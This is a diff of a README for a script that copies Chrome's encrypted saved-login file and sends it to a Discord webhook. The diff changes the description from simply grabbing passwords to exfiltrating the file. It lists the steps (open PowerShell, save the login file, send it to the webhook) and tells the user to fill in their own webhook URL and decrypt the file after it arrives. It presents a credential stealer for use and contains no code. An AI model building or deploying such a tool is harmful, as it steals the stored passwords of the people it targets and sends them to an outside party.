@@ -1,17 +1,17 @@
 
-# ChromePasswords
-Grabs saved Passwords from Chrome. 
+# chrome_passwords_discord
+Grabs the encrypted chrome login file and sends it to a discord webhook suing [I-am-Jakoby's] discord-upload function.
 
 ## How to use?
 
-This script is plug and play.
+This script is not plug and play, you will need to change the webhook url and decrypt the file yourself after it arrives in your discord.
 
 
 ## Features
 
 - open powershell
-- save chrome profile
-- paste profile to a file
+- save chrome login file
+- send file to discord webhook
 
 ## Feedback
 
